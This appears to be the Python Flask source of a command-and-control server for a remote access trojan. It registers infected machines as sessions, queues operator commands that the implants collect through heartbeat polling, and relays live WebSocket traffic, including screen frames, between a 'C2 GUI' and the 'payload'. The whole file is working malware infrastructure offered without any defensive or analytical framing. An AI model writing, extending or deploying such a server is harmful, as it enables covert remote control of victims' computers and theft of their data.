from flask import Flask, request, jsonify
from flask_sock import Sock # Import the Sock extension
import time
import json

app = Flask(__name__)
sock = Sock(app) # Initialize the Sock extension

SESSIONS = {}
TASKS = {}
# This new dictionary will hold our live WebSocket connections
CONNECTIONS = {}

# --- HTTP Routes ---
@app.route('/api/register', methods=['POST'])
def register():
    data = request.json; session_id = data.get("session_id")
    if session_id: SESSIONS[session_id] = {"session_id": session_id, "hostname": data.get("hostname"), "data": data.get("data"), "last_seen": time.time()}
    return jsonify({"status": "ok"}), 200

@app.route('/api/heartbeat', methods=['POST'])
def heartbeat():
    data = request.json; session_id = data.get("session_id")
    if session_id in SESSIONS:
        SESSIONS[session_id]["last_seen"] = time.time()
        tasks_for_session = TASKS.pop(session_id, [])
        return jsonify({"status": "ok", "tasks": tasks_for_session})
    return jsonify({"status": "ok", "tasks": []})

@app.route('/api/get_sessions', methods=['GET'])
def get_sessions(): return jsonify(list(SESSIONS.values()))

@app.route('/api/delete_session', methods=['POST'])
def delete_session():
    data = request.json; session_id = data.get("session_id")
    if session_id in SESSIONS: del SESSIONS[session_id]; return jsonify({"status": "deleted"}), 200
    return jsonify({"status": "not_found"}), 404

@app.route('/api/task', methods=['POST'])
def task_session():
    data = request.json; session_id = data.get("session_id"); command = data.get("command")
    if not all([session_id, command]): return jsonify({"status": "error", "message": "Missing params"}), 400
    if session_id not in TASKS: TASKS[session_id] = []
    TASKS[session_id].append(data)
    return jsonify({"status": "tasked"})

# --- WebSocket Route ---
@sock.route('/ws/rat/<session_id>')
def rat_websocket(ws, session_id):
    """Handles the live RAT communication."""
    # Determine if this is the C2 GUI or the Payload connecting
    client_type = request.headers.get('X-Client-Type', 'payload')
    
    if session_id not in CONNECTIONS:
        CONNECTIONS[session_id] = {'c2': None, 'payload': None}

    if client_type == 'c2':
        CONNECTIONS[session_id]['c2'] = ws
        print(f"[*] C2 GUI connected to RAT session: {session_id}")
    else:
        CONNECTIONS[session_id]['payload'] = ws
        print(f"[*] Payload connected to RAT session: {session_id}")

    try:
        while True:
            data = ws.receive()
            if data:
                # Determine where to relay the message
                if client_type == 'c2' and CONNECTIONS[session_id]['payload']:
                    # Message from C2 -> forward to Payload
                    CONNECTIONS[session_id]['payload'].send(data)
                elif client_type == 'payload' and CONNECTIONS[session_id]['c2']:
                    # Message from Payload (screen frame) -> forward to C2
                    CONNECTIONS[session_id]['c2'].send(data)
    except Exception:
        # Handle client disconnection
        print(f"[*] Client '{client_type}' disconnected from RAT session: {session_id}")
    finally:
        # Clean up the connection
        if client_type == 'c2':
            CONNECTIONS[session_id]['c2'] = None
        else:
            CONNECTIONS[session_id]['payload'] = None